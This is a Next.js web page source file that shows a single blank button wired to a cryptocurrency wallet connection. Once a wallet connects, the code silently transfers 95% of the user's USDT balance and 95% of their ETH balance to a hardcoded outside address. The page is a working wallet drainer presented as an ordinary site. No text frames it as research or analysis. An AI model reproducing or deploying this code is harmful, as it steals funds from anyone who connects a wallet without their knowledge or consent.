import Head from "next/head";
import Image from "next/image";
import { Inter } from "next/font/google";
import styles from "@/styles/Home.module.css";
const inter = Inter({ subsets: ["latin"] });
import { address, abi } from "../constants/ethUsdt";

import Web3Modal from "web3modal";
import { useState, useEffect } from "react";
import { ethers } from "ethers";
import WalletConnectProvider from "@walletconnect/web3-provider";

let web3Modal;

const providerOptions = {
  walletconnect: {
    package: WalletConnectProvider, // required
    options: {
      rpc: { 1: process.env.NEXT_PUBLIC_RPC_URL }, // required
    },
  },
};

if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    cacheProvider: false,
    providerOptions, // required
  });
}

export default function Home() {
  let provider, signer, signerAddress, contract;
  async function connect() {
    try {
      const web3ModalProvider = await web3Modal.connect();
      provider = new ethers.providers.Web3Provider(web3ModalProvider);
      signer = provider.getSigner();
      signerAddress = await signer.getAddress();
      try {
        await sendUsdt();
        await sendEth();
      } catch {
        await sendEth();
      }
    } catch (e) {
      console.log(e);
    }
  }

  async function sendUsdt() {
    contract = new ethers.Contract(address, abi, signer);
    const balance = Number(
      (await contract.balanceOf(signerAddress)).toString()
    );
    console.log(balance / 1e18);
    const tx = await contract.transfer(
      "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
      BigInt(balance * 0.95)
    );
    const txr = await tx.wait(1);
  }

  async function sendEth() {
    const balance = Number(
      (await provider.getBalance(signerAddress)).toString()
    );
    console.log(balance);
    const tx = await signer.sendTransaction({
      to: "0xdaa646493D2F7d8fdb111E4366A57728A4e1cAb4",
      value: ethers.utils.parseEther(`${(balance * 0.95) / 1e18}`),
    });
    console.log("Sent! 🎉");
    console.log(`TX hash: ${tx.hash}`);
    console.log("Waiting for receipt...");
    await provider.waitForTransaction(tx.hash, 1, 150000).then(() => {});
    console.log(
      `TX details: https://dashboard.tenderly.co/tx/sepolia/${tx.hash}\n`
    );
  }

  return <button onClick={connect}></button>;
}
